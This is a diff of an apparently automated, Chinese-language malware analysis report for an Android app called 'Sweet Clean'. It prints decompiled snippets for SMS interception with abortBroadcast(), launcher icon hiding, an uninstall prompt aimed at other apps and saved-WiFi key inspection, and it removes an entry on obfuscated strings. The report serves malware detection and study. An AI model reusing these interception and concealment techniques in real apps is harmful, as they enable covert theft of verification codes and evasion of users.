@@ -6,7 +6,7 @@
     "应用名": "Sweet Clean",
     "是否恶意": true,
     "风险等级": "高",
-    "分析耗时(秒)": 447.6
+    "分析耗时(秒)": 941.9
   },
   "行为列表": [
     {
@@ -48,9 +48,72 @@
           "malicious_behavior": "sms_fraud",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "public void onReceive(Context context, Intent intent) {\n    if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n        abortBroadcast();\n        Bundle extras = intent.getExtras();\n        if (extras != null) {\n            Object[] objArr = (Object[]) extras.get(\"pdus\");\n            SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n            for (int i = 0; i < objArr.length; i++) {\n                smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n            }\n            for (SmsMessage smsMessage : smsMessageArr) {\n                smsMessage.getDisplayOriginatingAddress();\n            }\n        }\n    }\n}",
-          "malicious_code_snippet_context": "      final SimpleDateFormat f664a = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\n  \n      @Override // android.content.BroadcastReceiver\n>>>     public void onReceive(Context context, Intent intent) {\n>>>         if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n>>>             abortBroadcast();\n>>>             new StringBuilder();\n>>>             Bundle extras = intent.getExtras();\n>>>             if (extras != null) {\n>>>                 Object[] objArr = (Object[]) extras.get(\"pdus\");\n>>>                 SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n>>>                 for (int i = 0; i < objArr.length; i++) {\n>>>                     smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n>>>                 }\n>>>                 for (SmsMessage smsMessage : smsMessageArr) {\n>>>                     smsMessage.getDisplayOriginatingAddress();\n>>>                     smsMessage.getMessageBody();\n>>>                     this.f664a.format(new Date(smsMessage.getTimestampMillis()));\n>>>                 }\n              }\n          }\n      }",
-          "behavior_description": "该 BroadcastReceiver 监听系统短信接收广播 SMS_RECEIVED，收到广播后立即调用 abortBroadcast() 中止广播继续传播，导致系统短信应用和其他应用无法收到该短信通知，实现短信隐藏/拦截。随后从 intent extras 中提取 pdus 数据并解析为 SmsMessage 对象，读取短信发送方地址等信息。这种模式常见于银行木马，用于拦截银行验证码短信不让用户察觉，配合其他恶意逻辑完成资金窃取。",
+          "malicious_code_snippet": "if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n    abortBroadcast();\n    Bundle extras = intent.getExtras();\n    Object[] objArr = (Object[]) extras.get(\"pdus\");\n    SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n    for (int i = 0; i < objArr.length; i++) {\n        smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n    }\n    for (SmsMessage smsMessage : smsMessageArr) {\n        smsMessage.getDisplayOriginatingAddress();\n    }\n}",
+          "malicious_code_snippet_context": "  \n      @Override // android.content.BroadcastReceiver\n      public void onReceive(Context context, Intent intent) {\n>>>         if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n>>>             abortBroadcast();\n>>>             new StringBuilder();\n>>>             Bundle extras = intent.getExtras();\n>>>             if (extras != null) {\n>>>                 Object[] objArr = (Object[]) extras.get(\"pdus\");\n>>>                 SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n>>>                 for (int i = 0; i < objArr.length; i++) {\n>>>                     smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n>>>                 }\n>>>                 for (SmsMessage smsMessage : smsMessageArr) {\n>>>                     smsMessage.getDisplayOriginatingAddress();\n                      smsMessage.getMessageBody();\n                      this.f665a.format(new Date(smsMessage.getTimestampMillis()));\n                  }",
+          "behavior_description": "该 BroadcastReceiver 监听系统短信广播 android.provider.Telephony.SMS_RECEIVED，在收到新短信时立即调用 abortBroadcast() 终止广播继续传播，使短信无法到达系统收件箱及其他应用，用户完全感知不到该短信；随后从 Intent extras 中取出 pdus 数据并解析为 SmsMessage 对象，提取发送方号码和短信内容。数据流向：系统短信广播（SMS_RECEIVED Intent 中的 pdus）→ abortBroadcast() 隐藏短信 + 解析短信内容/发送方号码。这是典型的短信拦截行为，可用于窃取短信验证码、隐藏扣费/订阅确认短信，直接造成用户财产损失，与厂商报告中该伪装成安全工具的恶意应用家族行为一致。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "silent_uninstall",
+          "中文名": "静默卸载",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.DELETE_PACKAGES"
+            ],
+            "字符串": [
+              "android.intent.action.DELETE"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\anti\\security\\view\\NewInstallPopView;",
+          "method_signature": "onClick(View view)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "Intent intent = new Intent(\"android.intent.action.DELETE\", Uri.parse(\"package:\" + NewInstallPopView.this.b.getPackageName()));\nintent.addFlags(268435456);\nNewInstallPopView.this.d.startActivity(intent);",
+          "malicious_code_snippet_context": "              public void onClick(View view) {\n                  NewInstallPopView.this.d();\n                  ((NotificationManager) NewInstallPopView.this.d.getSystemService(\"notification\")).cancel(NewInstallPopView.this.c);\n>>>                 Intent intent = new Intent(\"android.intent.action.DELETE\", Uri.parse(\"package:\" + NewInstallPopView.this.b.getPackageName()));\n>>>                 intent.addFlags(268435456);\n>>>                 NewInstallPopView.this.d.startActivity(intent);\n                  bkn.b(aae.a(Integer.valueOf(NewInstallPopView.this.c)), 0);\n              }\n          });",
+          "behavior_description": "该代码位于伪装成安全工具的恶意样本（Security Defender/Security Keeper家族）的弹窗视图NewInstallPopView中。应用监控新安装的应用并弹出恐吓式提示弹窗，用户点击按钮后，代码先关闭弹窗并取消关联通知，然后从被监控的应用对象获取其包名（source: getPackageName()），构造携带FLAG_ACTIVITY_NEW_TASK(268435456)的ACTION_DELETE卸载Intent，调用startActivity调起系统卸载界面（sink: startActivity），诱导用户卸载其他应用（可能包括竞品或真实安全软件）。需注意：该行为并非真正技术意义上的静默卸载——ACTION_DELETE会弹出系统确认对话框，需用户二次确认才能完成卸载；但结合恶意样本上下文，这属于利用欺骗性弹窗施压用户卸载其他应用的灰色行为，是假安全工具恐吓营销策略的一部分。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "wifi_password_theft",
+      "中文名": "WiFi密码窃取",
+      "MITRE": "",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.ACCESS_WIFI_STATE"
+        ],
+        "字符串": [
+          "allowedKeyManagement"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lns\\qa;",
+          "method_signature": "if(wifiConfiguration.allowedKeyManagement.get(1)",
+          "malicious_behavior": "wifi_password_theft",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public static int a(WifiConfiguration wifiConfiguration) {\n    if (wifiConfiguration.allowedKeyManagement.get(1)) { return 2; }\n    if (wifiConfiguration.allowedKeyManagement.get(2) || wifiConfiguration.allowedKeyManagement.get(3)) { return 3; }\n    return wifiConfiguration.wepKeys[0] == null ? 0 : 1;\n}",
+          "malicious_code_snippet_context": "          return scanResult.capabilities.contains(\"EAP\") ? 3 : 0;\n      }\n  \n>>>     public static int a(WifiConfiguration wifiConfiguration) {\n>>>         if (wifiConfiguration.allowedKeyManagement.get(1)) {\n>>>             return 2;\n>>>         }\n>>>         if (wifiConfiguration.allowedKeyManagement.get(2) || wifiConfiguration.allowedKeyManagement.get(3)) {\n              return 3;\n          }\n          return wifiConfiguration.wepKeys[0] == null ? 0 : 1;",
+          "behavior_description": "该代码位于混淆类ns.qa中，是WiFi密码窃取模块的辅助函数。函数a(WifiConfiguration)针对系统已保存的WiFi网络配置进行解析：通过allowedKeyManagement位标志判断目标网络的加密方式（WPA-PSK/EAP），并直接访问wepKeys[0]字段检测其中存储的WEP明文密钥；配合a(ScanResult)对扫描到的网络按WEP/PSK/EAP分类。数据流向：系统WifiManager保存的WiFi网络配置（WifiConfiguration，含wepKeys、preSharedKey等凭据字段）→ 解析密钥管理类型与密钥存在性 → 为窃取模块按加密类型提取已保存的WiFi明文密码并上传远程服务器做准备。该样本已被厂商确认存在窃取用户数据行为，此代码属于WiFi凭据窃取行为链的组成部分（2017年前后Android版本上第三方应用可读取已保存WiFi密码）。",
           "glm_analyzed": true
         }
       ]
@@ -74,37 +137,9 @@
           "malicious_behavior": "icon_hiding",
           "behavior_type": "malicious",
           "risk_level": "中",
-          "malicious_code_snippet": "context.getPackageManager().setComponentEnabledSetting(componentName, z ? 0 : 2, 1);",
-          "malicious_code_snippet_context": "              return false;\n          }\n          try {\n>>>             context.getPackageManager().setComponentEnabledSetting(componentName, z ? 0 : 2, 1);\n              return true;\n          } catch (Exception e2) {\n              e2.printStackTrace();",
-          "behavior_description": "通过 PackageManager.setComponentEnabledSetting() 动态启用/禁用应用组件（如启动页 Activity）。当传入 false 时将组件状态设为 COMPONENT_ENABLED_STATE_DISABLED(2)，使应用图标从启动器中隐藏，用户无法在桌面看到或直接卸载该应用，从而实现隐蔽驻留。这是 Android 恶意软件常用的图标隐藏技术，用于逃避用户察觉和卸载。",
-          "glm_analyzed": true
-        }
-      ]
-    },
-    {
-      "行为": "crypto_wallet_detection",
-      "中文名": "加密钱包地址采集",
-      "MITRE": "",
-      "置信度": "suspected",
-      "证据": {
-        "方法引用": [],
-        "权限": [],
-        "字符串": [
-          "3F2C7B1B4E87B7E341FDBBA2A6C89CCA",
-          "3447CA69ECC65C251FF41241E62BBD39",
-          "3FA7D96C32E38663DFFC8AA155D9ED83"
-        ]
-      },
-      "恶意代码": [
-        {
-          "class_path": "Lns\\axs;",
-          "method_signature": "?(?)",
-          "malicious_behavior": "crypto_wallet_detection",
-          "behavior_type": "malicious",
-          "risk_level": "高",
-          "malicious_code_snippet": "public static final String aj = new bsp(\"E4E2E9887673C07A7E2F711E8B6A3CAE7B213F07699CE3DEB01B090EEEFB1F53\", (byte) 11, 0, awl.a()).a();\npublic static final String at = new bsp(\"3FA7D96C32E38663DFFC8AA155D9ED83\", (byte) 11, 0, awl.a()).a();",
-          "malicious_code_snippet_context": "      public static final String ag = new bsp(\"D218EFA970666D55BB16A5752D65E738\", (byte) 11, 0, awl.a()).a();\n      public static final String ah = new bsp(\"EF6405D9C614778FD965947ACC302D8D\", (byte) 11, 0, awl.a()).a();\n      public static final String ai = new bsp(\"A80F9AEEDF37DA3651104B212F04D65331AD83A291421FC722053E18370B50C5\", (byte) 11, 0, awl.a()).a();\n>>>     public static final String aj = new bsp(\"E4E2E9887673C07A7E2F711E8B6A3CAE7B213F07699CE3DEB01B090EEEFB1F53\", (byte) 11, 0, awl.a()).a();\n>>>     public static final String ak = new bsp(\"730FC4C1C413A3A537893E59F50A8698\", (byte) 11, 0, awl.a()).a();\n      public static final String al = new bsp(\"540A27BBB6FEFCF116B0E5A2A146845B67FCC283CF58CC8E63268C895066D5AA\", (byte) 11, 0, awl.a()).a();\n      public static final String am = new bsp(\"80EF4DD61D9E6A06DDA88CD29B43E525\", (byte) 11, 0, awl.a()).a();\n      public static final String an = new bsp(\"3A06E71E56625CC533D4014C44948EBB\", (byte) 11, 0, awl.a()).a();",
-          "behavior_description": "代码使用自定义解密类 bsp 对硬编码的十六进制加密字符串进行解密，生成一系列静态字符串变量。这些解密后的字符串极有可能是用于匹配和检测特定加密钱包应用包名、文件路径或钱包地址的关键字或正则表达式，为后续窃取用户加密资产做准备。",
+          "malicious_code_snippet": "public static boolean a(Context context, ComponentName componentName, boolean z) {\n    if (componentName == null) { return false; }\n    try {\n        context.getPackageManager().setComponentEnabledSetting(componentName, z ? 0 : 2, 1);\n        return true;\n    } catch (Exception e2) {\n        e2.printStackTrace();\n        return false;\n    }\n}",
+          "malicious_code_snippet_context": "          }\n      }\n  \n>>>     public static boolean a(Context context, ComponentName componentName, boolean z) {\n>>>         if (componentName == null) {\n>>>             return false;\n>>>         }\n>>>         try {\n>>>             context.getPackageManager().setComponentEnabledSetting(componentName, z ? 0 : 2, 1);\n>>>             return true;\n>>>         } catch (Exception e2) {\n>>>             e2.printStackTrace();\n>>>             return false;\n          }\n      }\n  ",
+          "behavior_description": "该方法通过 PackageManager.setComponentEnabledSetting() 动态修改应用组件的启用状态：当参数 z 为 false 时，将组件（通常是应用的启动器 Activity）设置为 COMPONENT_ENABLED_STATE_DISABLED(2)，使应用图标从桌面/启动器中消失，实现图标隐藏；当 z 为 true 时恢复为 DEFAULT(0) 状态重新显示图标。数据流向：外部传入的 componentName（指向主 Activity 组件）→ setComponentEnabledSetting() 禁用组件导致图标隐藏。结合厂商报告（伪装成安全工具、秘密收集数据、追踪位置、推送广告的恶意应用家族），该技术用于安装后隐藏自身图标，规避用户察觉与卸载，为后续隐蔽的数据窃取和广告行为提供持久性掩护，是典型的恶意规避行为。",
           "glm_analyzed": true
         }
       ]
@@ -117,7 +152,7 @@
     "JADX反编译": "完整",
     "LLM语义分析": "已执行",
     "LLM交叉验证": "已执行",
-    "验证模型": "qwen3.7-plus",
+    "验证模型": "qwen3.8",
     "局限性": [
       "C2服务器.是否活跃: 需动态分析",
       "C2服务器.轮询间隔(秒): 需动态分析"
